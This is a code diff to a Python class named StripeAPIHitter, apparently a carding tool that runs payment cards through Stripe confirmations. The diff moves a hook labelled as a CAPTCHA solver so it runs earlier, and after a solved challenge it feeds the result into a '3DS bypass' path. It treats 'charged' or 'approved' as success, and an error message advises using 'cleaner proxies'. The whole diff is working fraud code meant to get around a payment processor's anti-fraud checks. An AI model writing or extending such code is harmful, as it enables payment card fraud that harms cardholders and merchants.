@@ -1407,6 +1407,43 @@ class StripeAPIHitter:
                                     or next_action.get("source")
                                 )
 
+                                # === CAPTCHA SOLVER HOOK (Hitchk) ===
+                                if (captcha_triggered or (isinstance(sdk.get('stripe_js'), dict) and 'rqdata' in sdk.get('stripe_js', {}))) and sdk.get('type') == 'intent_confirmation_challenge':
+                                    if _HAS_3DS_BYPASS:
+                                        try:
+                                            _cap_type = "setup_intent" if is_setup_intent else "payment_intent"
+                                            _cap_result = await attempt_captcha_verification(
+                                                loop, _cffi_session, self.pk_live,
+                                                client_secret, intent_id, _cap_type, sdk, headers, pm_id
+                                            )
+                                            if _cap_result:
+                                                _cs, _cm = _cap_result
+                                                if _cs in ('charged', 'approved'):
+                                                    result['success'] = True
+                                                    result['decline_code'] = _cm
+                                                    return result
+                                                elif _cs in ('declined', 'live_declined'):
+                                                    result['decline_code'] = _cm
+                                                    result['error'] = _cm
+                                                    result['raw_response'] = confirm_json
+                                                    return result
+                                                elif _cs == 'requires_action':
+                                                    # Captcha solved, but requires 3DS next!
+                                                    # Update variables in-place so standard 3DS runs next
+                                                    confirm_json = _cm
+                                                    res = confirm_json.get('payment_intent') or confirm_json.get('setup_intent') or confirm_json
+                                                    if not isinstance(res, dict): res = confirm_json
+                                                    next_action = res.get("next_action", {}) or {}
+                                                    sdk = next_action.get("use_stripe_sdk", {}) or {}
+                                                    source = (
+                                                        sdk.get("three_d_secure_2_source")
+                                                        or sdk.get("source")
+                                                        or next_action.get("source")
+                                                    )
+                                                    captcha_triggered = False
+                                        except Exception as _cap_ex:
+                                            print(f"DEBUG: Captcha solver failed: {_cap_ex}")
+
                                 # If CAPTCHA triggered and no source found, retry confirm for fresh 3DS path
                                 if captcha_triggered and not source:
                                     try:
@@ -1527,28 +1564,7 @@ class StripeAPIHitter:
                                         state = "3DS Attempt failed"
                                     processed_auth = True
                                 else:
-                                    # === CAPTCHA SOLVER HOOK (Hitchk) ===
                                     if captcha_triggered or (isinstance(sdk.get('stripe_js'), dict) and 'rqdata' in sdk.get('stripe_js', {})):
-                                        if _HAS_3DS_BYPASS and sdk.get('type') == 'intent_confirmation_challenge':
-                                            try:
-                                                _cap_type = "setup_intent" if is_setup_intent else "payment_intent"
-                                                _cap_result = await attempt_captcha_verification(
-                                                    loop, _cffi_session, self.pk_live,
-                                                    client_secret, intent_id, _cap_type, sdk, headers
-                                                )
-                                                if _cap_result:
-                                                    _cs, _cm = _cap_result
-                                                    if _cs in ('charged', 'approved'):
-                                                        result['success'] = True
-                                                        result['decline_code'] = _cm
-                                                        return result
-                                                    elif _cs in ('declined', 'live_declined'):
-                                                        result['decline_code'] = _cm
-                                                        result['error'] = _cm
-                                                        result['raw_response'] = confirm_json
-                                                        return result
-                                            except Exception as _cap_ex:
-                                                print(f"DEBUG: Captcha solver failed: {_cap_ex}")
                                         result['decline_code'] = 'stripe_captcha_bypass_failed'
                                         result['error'] = 'Stripe CAPTCHA (rqdata) triggered and bypass could not resolve it. Try cleaner proxies.'
                                     else:
